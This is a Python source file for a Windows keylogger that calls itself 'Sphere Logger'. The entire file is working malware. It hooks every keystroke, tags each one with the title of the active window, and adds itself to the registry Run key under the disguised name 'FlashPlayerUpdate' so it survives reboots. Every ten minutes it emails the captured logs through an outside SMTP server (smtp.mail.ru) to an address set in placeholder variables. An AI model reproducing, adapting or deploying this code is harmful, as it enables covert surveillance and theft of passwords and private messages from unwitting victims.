
from pynput import keyboard
from time import sleep, time
from os import path, makedirs, listdir, remove
from winreg import *
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from uuid import uuid4
from PIL import ImageGrab
from threading import Thread, Lock

import smtplib
import datetime
import pyperclip
import sys
import win32gui as w32
import socket


DIR = r'.'

TIME = 600
tLock = Lock()


keys = {
    'Key.backspace': '&lt;BACKSPACE&gt;',
    'Key.alt_l': '&lt;LEFT-ALT&gt;',
    'Key.alt_r': '&lt;RIGHT-KEY&gt;',
    'Key.shift': '&lt;SHIFT&gt;',
    'Key.ctrl_l': '&lt;LEFT-CONTROL&gt;',
    'Key.ctrl_r': '&lt;RIGHT-CONTROL&gt;',
    'Key.space': ' ',
    'Key.enter': '&lt;ENTER&gt;',
    'Key.up': '&lt;ARROW-UP&gt;',
    'Key.down': '&lt;ARROW-DOWN&gt;',
    'Key.right': '&lt;ARROW-RIGHT&gt;',
    'Key.left': '&lt;ARROW-LEFT&gt;',
    'Key.num_lock': '&lt;NUM-LOCK&gt;',
    'Key.caps_lock': '&lt;CAPS-LOCK&gt;',
    'Key.shift_r': '&lt;SHIFT-RIGHT&gt;',
    'Key.shift_l': '&lt;SHIFT-LEFT&gt;',
    'Key.cmd': '&lt;CMD-KEY&gt;',
    'Key.tab': '&lt;TAB&gt;',
    'Key.f1': '&lt;F1&gt;',
    'Key.f2': '&lt;F2&gt;',
    'Key.f3': '&lt;F3&gt;',
    'Key.f4': '&lt;F4&gt;',
    'Key.f5': '&lt;F5&gt;',
    'Key.f6': '&lt;F6&gt;',
    'Key.f7': '&lt;F7&gt;',
    'Key.f8': '&lt;F8&gt;',
    'Key.f9': '&lt;F9&gt;',
    'Key.f10': '&lt;F10&gt;',
    'Key.f11': '&lt;F11&gt;',
    'Key.f12': '&lt;F12&gt;',
    'Key.home': '&lt;F12&gt;',
    'Key.print_screen': '&lt;PRINT-SCREEN&gt;',
    'Key.delete': '&lt;DELETE&gt;',
}

htmlTemplate = """
<html lang="en">
<head>
    <meta charset="UTF-8">
    <style>
   .header {
    color: purple;
    font-size: 160%;
   }
   .logs {
   color: black;
   font-size: 100%;
   }
   .special_key {
   color: blue;
   font-size: 80%;
   }
   .clip {
   color: red;
   font-size: 100%;
   }
  </style>
</head>

<body>
"""

raw_log = {}


def install():

        a_reg = ConnectRegistry(None, HKEY_CURRENT_USER)
        a_key = OpenKey(a_reg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(a_key, "FlashPlayerUpdate", 0, REG_SZ, sys.argv[0].replace('/', '\\'))
        open('ini', 'w')

if not path.isfile('ini'):
    install()


def send_log():
    global raw_log, last_window
    while True:
        try:

            tLock.acquire()

            if raw_log:
                sender = USER
                gmail_password = PASSWORD
                recipients = [REC]

                outer = MIMEMultipart('alternative')
                outer['Subject'] = 'Sphere Logger: ' + socket.gethostname() + ': ' + \
                                   str(datetime.datetime.strftime(datetime.datetime.now(), '%d-%m-%y %H:%M:%S'))
                outer['To'] = ', '.join(recipients)
                outer['From'] = sender
                outer.preamble = '\n'

                outer.attach(MIMEText(create_log(), 'html'))

                composed = outer.as_string()

                try:
                    with smtplib.SMTP('smtp.mail.ru', port=587) as s:
                        s.ehlo()
                        s.starttls()
                        s.ehlo()
                        s.login(sender, gmail_password)
                        s.sendmail(sender, recipients, composed)
                        s.close()
                    print("Email sent!")
                except:
                    print("Unable to send the email. Error: ", sys.exc_info()[0])
                    raise

                raw_log = {}
                last_window = ''
                sleep(TIME)

        except Exception as e:
            print(e)
        finally:
            tLock.release()


def create_log():
    body = '\n'
    for i in raw_log:
        body += '<p class="header">{}</p>'.format(i)
        body += '<p class="logs">{}</p>'.format(raw_log[i])

    return htmlTemplate + body + """
    </body>
</html>"""


def addkey(key):
    try:
        return str(key.char)

    except:
        if str(key) not in keys:
            return str(key)
        else:
            return '<font class="special_key">' + keys[str(key)] + '</font>'


def hook(key):
    global last_window, current_time

    wind_now = w32.GetWindowText(w32.GetForegroundWindow())
    if wind_now not in raw_log:
        raw_log[wind_now] = ''

    if wind_now != last_window:
        last_window = wind_now

        current_time = int(time())
        raw_log[wind_now] += addkey(key)
    else:
        if current_time >= int(time()) - 4:
            current_time = int(time())
            raw_log[wind_now] += addkey(key)
        else:
            raw_log[wind_now] += '<br>' + addkey(key)


last_window = ''
current_time = int(time())


if __name__ == '__main__':
    triggerThread = Thread(target=send_log)
    triggerThread.start()
    with keyboard.Listener(
            on_press=hook) as listener:
        listener.join()
